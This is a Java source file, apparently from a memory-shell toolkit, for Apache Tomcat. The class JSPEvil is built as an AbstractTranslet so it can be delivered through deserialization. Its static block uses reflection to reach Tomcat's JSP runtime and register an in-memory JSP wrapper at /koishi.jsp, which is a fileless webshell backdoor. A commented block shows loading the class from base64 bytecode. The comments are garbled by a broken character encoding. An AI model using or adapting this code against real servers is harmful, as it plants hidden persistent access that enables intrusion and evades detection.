package com.tomcat.memshell.JSPMemShell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.tomcat.util.ClassUtil;
import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.jasper.EmbeddedServletOptions;
import org.apache.jasper.Options;
import org.apache.jasper.compiler.JspRuntimeContext;
import org.apache.jasper.servlet.JspServletWrapper;

import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import java.util.HashMap;

public class JSPEvil extends AbstractTranslet {
    private static final String jsppath = "/koishi.jsp";

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
            StandardContext standardContext = (StandardContext) standardroot.getContext();
            //�� StandardContext ���� ContainerBase �л�ȡ children ����
            HashMap<String, Container> _children = (HashMap<String, Container>) getFieldValue(standardContext,
                    "children");
            //��ȡ Wrapper
            Wrapper _wrapper = (Wrapper) _children.get("jsp");
            //��ȡjspServlet����
            Servlet _jspServlet = (Servlet) getFieldValue(_wrapper, "instance");
            // ��ȡServletConfig����
            ServletConfig _servletConfig = (ServletConfig) getFieldValue(_jspServlet, "config");
            //��ȡoptions�б���Ķ���
            EmbeddedServletOptions _option = (EmbeddedServletOptions) getFieldValue(_jspServlet, "options");
            // ��ȡJspRuntimeContext����
            JspRuntimeContext _jspRuntimeContext = (JspRuntimeContext) getFieldValue(_jspServlet, "rctxt");

/*
            String clazzStr = "..."; // ���������JSPEvil���ֽ����base64�����ַ���
            byte[] classBytes = java.util.Base64.getDecoder().decode(clazzStr);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class,
                    int.class);
            method.setAccessible(true);
            Class clazz = (Class) method.invoke(classLoader, classBytes, 0, classBytes.length);
*/

            Class clazz = ClassUtil.getClass(ClassUtil.KOISHI_JSP);
            JspServletWrapper memjsp = (JspServletWrapper) clazz.getDeclaredConstructor(ServletConfig.class, Options.class,
                    JspRuntimeContext.class).newInstance(_servletConfig, _option, _jspRuntimeContext);

            _jspRuntimeContext.addWrapper(jsppath, memjsp);

        } catch (Exception ignored) {}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        java.lang.reflect.Field declaredField;
        java.lang.Class clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            } catch (Exception ignored){}
            clazz = clazz.getSuperclass();
        }
        return null;
    }
}
